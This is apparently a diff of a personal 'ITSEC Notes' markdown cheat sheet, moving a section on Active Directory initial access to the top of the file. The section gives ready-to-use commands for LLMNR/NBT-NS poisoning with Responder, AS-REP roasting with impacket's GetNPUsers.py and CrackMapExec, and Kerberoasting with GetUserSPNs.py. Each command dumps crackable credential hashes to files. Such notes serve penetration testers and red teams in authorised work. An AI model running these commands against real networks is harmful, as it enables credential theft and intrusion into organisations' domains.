@@ -1,5 +1,50 @@
 # **ITSEC Notes**
 
+## Poisoning and Spoofing (LLMNR NBT-NS)
+
+Pretender
+https://github.com/RedTeamPentesting/pretender
+
+Responder
+https://github.com/lgandx/Responder
+
+Examples
+
+``` responder -I eth0 ```
+
+``` responder -I eth0 -A ``` Analyze mode
+
+``` responder -I eth0 -wF ``` WPAD
+
+## ASREProast
+https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
+
+users list dynamically queried with an LDAP anonymous bind
+
+```
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
+``` 
+
+users list dynamically queried with a LDAP authenticated bind (password)
+
+```
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
+``` 
+
+CrackMapExec
+
+```
+crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --KdcHost $KeyDistributionCenter
+``` 
+
+## Kerberoasting
+https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
+
+```
+python GetUserSPNs.py -debug -request -outputfile kerberoasting.txt -dc-ip 1.1.1.1 -target-domain domain.local domain/user:password
+```
+
+
 ## Tools
 https://github.com/Cerbersec/Ares
 
@@ -109,47 +154,4 @@ nslookup
  _Idap._tcp.dc_msdcs."Domain_Name" 
  ````
 
-# Initial Access
-## Poisoning and Spoofing (LLMNR NBT-NS)
 
-Pretender
-https://github.com/RedTeamPentesting/pretender
-
-Responder
-https://github.com/lgandx/Responder
-
-Examples
-
-``` responder -I eth0 ```
-
-``` responder -I eth0 -A ``` Analyze mode
-
-``` responder -I eth0 -wF ``` WPAD
-
-## ASREProast
-https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
-
-users list dynamically queried with an LDAP anonymous bind
-
-```
-GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
-``` 
-
-users list dynamically queried with a LDAP authenticated bind (password)
-
-```
-GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
-``` 
-
-CrackMapExec
-
-```
-crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --KdcHost $KeyDistributionCenter
-``` 
-
-## Kerberoasting
-https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
-
-```
-python GetUserSPNs.py -debug -request -outputfile kerberoasting.txt -dc-ip 1.1.1.1 -target-domain domain.local domain/user:password
-```
